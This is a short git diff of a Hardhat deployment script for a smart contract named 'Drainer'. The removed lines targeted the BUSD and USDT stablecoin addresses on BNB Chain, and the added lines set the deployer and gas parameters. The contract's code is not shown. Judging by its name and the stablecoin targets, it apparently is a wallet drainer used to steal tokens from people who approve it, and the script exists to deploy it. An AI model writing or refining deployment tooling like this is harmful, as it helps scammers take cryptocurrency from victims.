@@ -1,13 +1,15 @@
 const hre = require("hardhat");
 
 async function main() {
-  const tokenAddresses = [
-    "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
-    "0x55d398326f99059ff775485246999027b3197955", // USDT
-  ];
+  const [deployer] = await hre.ethers.getSigners();
+  console.log("Deploying with:", deployer.address);
 
   const Drainer = await hre.ethers.getContractFactory("Drainer");
-  const drainer = await Drainer.deploy(tokenAddresses);
+  const drainer = await Drainer.deploy({
+    maxFeePerGas: hre.ethers.parseUnits("5", "gwei"),
+    maxPriorityFeePerGas: hre.ethers.parseUnits("1", "gwei"),
+    gasLimit: 2500000,
+  });
   await drainer.waitForDeployment();
 
   console.log(`Drainer deployed to: ${await drainer.getAddress()}`);
